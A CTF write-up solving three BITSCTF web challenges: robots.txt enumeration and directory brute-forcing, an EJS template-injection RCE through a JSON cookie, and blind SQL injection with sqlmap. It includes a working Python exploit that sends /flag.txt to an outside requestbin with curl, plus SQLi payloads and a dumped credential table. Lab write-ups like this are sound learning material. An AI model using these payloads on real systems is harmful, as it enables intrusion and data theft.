# Web Challenges

# Web Challenges

### Conquest

#### Description

Our Mogambro is a lucid dreamer who has meticulously replicated one of his sessions in the form of the given website. Can you also complete the quest which Mogambro failed to do?

[http://20.244.82.82:2913/](http://20.244.82.82:2913/)

#### Solution

This challenge felt more like `misc` rather then `web`.

First we are given a poem which we need to decipher:

```markdown
In the realm of ones and zeros, I reside,  
A digital denizen, where circuits coincide.  
I calculate and compute, with lightning speed,  
Yet devoid of emotion, a machine indeed.  
What am I, a marvel of modern art,  
Playing my part, in the human-smart cart?
```

The only (most known) machine must refer to `/robots.txt`

```markdown
User-Agent: *
Disallow: /tournament
```

Second puzzle:

```markdown
# Welcome to the Arena, Player!

Beat our knights by slaying the dragon the fastest and obtain the secret scroll as a gift.

The dragon's portal lies among some of the well-known paths traversed by men."
```

The puzzle must have been solved, but we can bruteforce directory using wordlist. [common.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/common.txt) wordlist is always goto for simple enumeration and in the end we get a hit: `/tournament/humans.txt`

To defeat the dragon request is made:

```bash
curl 'http://20.244.82.82:2913/legend' -d 'slay=1582510775.828625'
```

After playing around you can set `slay` to be really huge value to get the flag.

```bash
➜ curl http://20.244.82.82:2913/legend -d 'slay=9999999999999'
BITSCTF{7HE_r341_7r345Ur3_W45_7H3_Fr13ND5_W3_M4D3_410N6_7H3_W4Y}
```

::: tip Flag
`BITSCTF{7HE\_r341\_7r345Ur3\_W45\_7H3\_Fr13ND5\_W3\_M4D3\_410N6\_7H3\_W4Y}`
:::

### Just Wierd Things

#### Description

You have the power to change some things. Now will you be mogambro or someone else?\
You might stumble across some red herrings...\


> meness

App: [http://20.244.82.82:5000/](http://20.244.82.82:5000/)\
Source: [justwierdthings.zip](https://ctf.bitskrieg.org/files/522445f97fca0f336536b95d81964ea6/justwierdthings.zip?token=eyJ1c2VyX2lkIjoxNDI5LCJ0ZWFtX2lkIjo4NzMsImZpbGVfaWQiOjMzfQ.ZdL67g.KQh3MvrdXzC8eqeesKhHrbPDo7M)

#### Analysis

If we carefully analyze source code we can see that `res.render` takes 2 arguments. Syntax: `res.render(view [, locals] [, callback])`.

::: tip
TIL you can use [npm audit](https://docs.npmjs.com/cli/v10/commands/npm-audit) to check for known vulnaribilities in JS application
:::

```js
app.get('/', (req, res) => {
    let mainJwt = req.cookies.jwt || {};

    try {
		...
    } catch(error) {
        if (typeof mainJwt === 'object') {
            mainJwt.error = error;
        } else {
            mainJwt = { error: error };
        } 
    }
    
    res.render('index', mainJwt);
});
```

There's already known "exploit" which user introduces to the application: [https://github.com/mde/ejs/issues/451](https://github.com/mde/ejs/issues/451). To make use of exploit first we need to pollute `locals` variable and we can do that through `error`.

Application is using [cookie-parser](https://www.npmjs.com/package/cookie-parser) package and if we lookup the docuentation:

> In addition, this module supports special "JSON cookies". These are cookie where the value is prefixed with `j:`. When these values are encountered, the value will be exposed as the result of `JSON.parse`. If parsing fails, the original value will remain.

Knowing this we can construct payload with `jwt=j:PAYLOAD`

Shoutout to `outsparkled` for the explanation about semicolon encoding in the payload.

![image](/assets/ctf/bitsctf/bitsctf-web-2.png)

Detailed analysis of RCE: [https://eslam.io/posts/ejs-server-side-template-injection-rce/](https://eslam.io/posts/ejs-server-side-template-injection-rce/)

#### Solution

Whatever command gets executed will not get displayed to us, so we need to exfiltrate that data. In this case we can use `curl`, since we know flag is located at `/flag.txt` (from Dockerfile) we just make request to any requestbin (I used beeceptor) and finally profit.

```py
import requests

URL = 'http://20.244.82.82:5000/'
command = "curl -d @/flag.txt https://uwuos.free.beeceptor.com"
payload = "process.mainModule.require('child_process').execSync('%s')" % command
payload_cookie = (
'''
j: {
    "settings": {
        "view options": {
            "outputFunctionName": "whatever; PAYLOAD ;//"
        }
    }
}
'''
.replace('\n', '')           # Normilize json
.replace(';', '%3b')         # URLEncode semicolons for parser
.replace("PAYLOAD", payload) # Inject payload
)
COOKIES = {
    "jwt": payload_cookie
}

resp = requests.get(URL, cookies=COOKIES)
print(resp) 
```

::: tip Flag
`BITSCTF{Juggling\_With\_Tokens:\_A\_Circus\_of\_RCE!}`
:::

### Too Blind To See

#### Description

Mogambro, our rookie intern, just stepped foot into the prestigious Software Firm. His big moment, the first project review, is knocking at the door like a pesky neighbor. But wait! Somewhere in his app lurks a secret which the admins are not aware of, hidden behind the password '**fluffybutterfly**'. Can you crack the code and rescue Mogambro from this password puzzle? The clock is ticking!

[http://20.244.82.82:7000/](http://20.244.82.82:7000/)

#### Solution

**Approach 1**

On `/login` route there's 2 ways to login, normal and admin. We already suspect that there's already an SQLi, but where? Challenge title is another hint, so probably blind SQLi.

Finding the payload to work was tricky even after CTF ended. Shout out to [daffainfo](https://daffa.info) for the help 👀.

![image](/assets/ctf/bitsctf/bitsctf-web-1.png)

```bash
└─$ curl 'http://20.244.82.82:7000/yesyoudidit' -d "username='test' or true --&password="

            <p>Hello Admin. It's good to have you back</p>
            <h1>Here is the flag  BITSCTF{FAKE_FLAG}</h1>
```

DBMS seems SQLite3.

At this point we had to enumerate the database using blind injection attack, but I didnt want to write script for it and wanted to explore SQLMap a bit more.

Without SQLMap: [PayloadsAllTheThings: SQLite Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md)

```bash
└─$ sqlmap -u 'http://20.244.82.82:7000/yesyoudidit' --data="username='test&password=" --dbms=SQLite

[18:39:01] [PAYLOAD] 'test' OR NOT 1316>1315-- CGJa
POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N]

sqlmap identified the following injection point(s) with a total of 300 HTTP(s) requests:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
    Payload: username='test' OR NOT 6102=6102-- aypu&password=
    Vector: OR NOT [INFERENCE]
---
[18:39:07] [INFO] testing SQLite
[18:39:07] [PAYLOAD] 'test' OR NOT LAST_INSERT_ROWID()=LAST_INSERT_ROWID()-- QOEa
[18:39:07] [INFO] confirming SQLite
[18:39:07] [PAYLOAD] 'test' OR NOT SQLITE_VERSION()=SQLITE_VERSION()-- xWJo
[18:39:07] [INFO] actively fingerprinting SQLite
[18:39:07] [PAYLOAD] 'test' OR NOT RANDOMBLOB(-1)>0-- Tokt
[18:39:08] [INFO] the back-end DBMS is SQLite
web application technology: Express
back-end DBMS: SQLite
[18:39:08] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 257 times
```

```bash
└─$ sqlmap -u 'http://20.244.82.82:7000/yesyoudidit' --data="username='test&password=" --dbms=SQLite --tables
...
+----------+
| maillist |
| userdata |
+----------+
...
```

```bash
└─$ sqlmap -u 'http://20.244.82.82:7000/yesyoudidit' --data="username='test&password=" --dbms=SQLite -T maillist --dump --threads 10

+-----------------------------+-----------------+
| email                       | password        |
+-----------------------------+-----------------+
| krazykorgaonkar@hotmail.com | fluffybutterfly |
+-----------------------------+-----------------+
```

```bash
└─$ curl 'http://20.244.82.82:7000/welcome-homie' -d 'email=krazykorgaonkar%40hotmail.com&password=fluffybutterfly'
<h1>I give up .. Here's the flag (The real one ;) )   BITSCTF{5UB5Cr183r5_4r3_M0r3_7HAN_JU5T_C0N5UM3r5}</h1>                                                                                                       
```

**Approach 2**

Writeup by: [slaee](https://github.com/slaee): [https://github.com/slaee/ret-CTF-writeups/tree/main/2024/bitsCTF/toblindtosee](https://github.com/slaee/ret-CTF-writeups/tree/main/2024/bitsCTF/toblindtosee)

There was a form on main page:

```html
 <form action="/final-destination" method="post">
    <div class="input_bt">
    <input type="text" class="mail_bt" placeholder="Your Email" name="email" required>
    <button type="submit" class="subscribe_bt" id="basic-addon2">Subscribe</button>
 </div>
 </form>
```

The endpoint was also vulnarable to the SQLi and could have been exploited.

#### Flag

::: tip Flag
`BITSCTF{5UB5Cr183r5\_4r3\_M0r3\_7HAN\_JU5T\_C0N5UM3r5}`
:::
